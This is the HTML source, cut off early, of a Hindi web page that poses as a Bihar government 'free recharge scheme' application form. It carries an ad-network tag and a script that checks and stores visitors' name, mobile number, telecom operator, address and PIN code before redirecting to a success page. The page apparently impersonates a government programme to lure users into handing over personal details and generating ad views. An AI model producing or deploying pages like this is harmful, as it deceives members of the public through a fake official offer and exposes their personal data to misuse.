<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="monetag" content="cbcd4bc1eb1fee1af7c3b337e1f1c4ca" />
  <title>बिहार सरकार - फ्री रिचार्ज योजना आवेदन</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f7fb;
      margin: 0; padding: 0;
      display: flex; justify-content: center; align-items: flex-start;
      min-height: 100vh; padding-top: 30px;
    }
    .container {
      background: white;
      max-width: 520px;
      width: 95%;
      padding: 27px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.12);
    }
    h1 {
      text-align: center;
      color: #036d03;
      font-weight: 700;
      margin-bottom: 20px;
    }
    .bhashan {
      background: #f5fff0;
      border-radius: 12px;
      font-size: 17px;
      padding: 15px 18px;
      color: #333;
      margin-bottom: 18px;
      border-left: 6px solid #43bb5e;
    }
    .ad-box {
      background: #ffff99;
      padding: 13px;
      margin: 13px 0;
      border-radius: 8px;
      text-align: center;
    }
    label {
      display: block;
      color: #333;
      margin-bottom: 6px;
      font-weight: 600;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border: 2px solid #028802;
      border-radius: 7px;
      font-size: 16px;
    }
    button {
      background-color: #028802;
      color: white;
      font-weight: 700;
      padding: 14px 0;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      if(localStorage.getItem('userData')) {
        window.location.href = 'success.html';
      }
    });
    function validateForm() {
      const name = document.getElementById('name').value.trim();
      const mobile = document.getElementById('mobile').value.trim();
      const operator = document.getElementById('operator').value;
      const address = document.getElementById('address').value.trim();
      const pin = document.getElementById('pin').value.trim();
      if (name.length < 3 || !/^[6-9]\d{9}$/.test(mobile) || operator === '' || address.length < 5 || !/^\d{6}$/.test(pin)) {
        alert('सही जानकारी भरें');
        return false;
      }
      return true;
    }
    function submitForm(event) {
      event.preventDefault();
      if(!validateForm()) return;
      const formData = {
        name: document.getElementById('name').value.trim(),
        mobile: document.getElementById('mobile').value.trim(),
        operator: document.getElementById('operator').value,
        address: document.getElementById('address').value.trim(),
        pin: document.getElementById('pin').value.trim()
      };
      localStorage.setItem('userData', JSON.stringify(formData));
      window.location.href = 'success.html';
    }
  </script>
</head>
<body>
  <div class="container">
    <h1>बिहार सरकार - फ्री रिचार्ज योजना</h1>
    <div class="bhashan">
